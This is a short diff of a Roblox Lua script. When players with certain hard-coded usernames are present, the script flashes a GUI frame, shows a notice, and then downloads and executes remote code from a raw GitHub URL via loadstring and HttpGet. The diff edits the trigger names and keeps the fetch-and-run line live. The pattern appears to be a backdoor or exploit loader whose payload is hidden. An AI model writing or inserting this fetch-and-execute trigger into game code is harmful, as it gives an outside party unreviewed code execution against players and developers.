@@ -203,7 +203,7 @@ wait(4)
 
 local Players = game:GetService("Players")
 for i, v in pairs(Players:GetPlayers()) do
-    if v.Name == "rest_adnti|hack" or v.Name == "lapu_lasap" or v.Name == "lapu_lasap2" then
+    if v.Name == "rest_adnti|hack" or v.Name == "lapu_laasap" or v.Name == "lapu_alasap2" then
         for i = 1, 2 do
             frame.BackgroundColor3 = Color3.new(1, 1, 1)
             wait(0.1)
@@ -226,7 +226,7 @@ for i, v in pairs(Players:GetPlayers()) do
             Duration = 5
         })
         wait(0.2)
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/gitolan/gefbymeop-/main/gefori"))()
+                loadstring(game:HttpGet("https://raw.githubusercontent.com/gitolan/gefbymeop-/main/gefori"))()
         screenGui:Destroy()
     end
 end
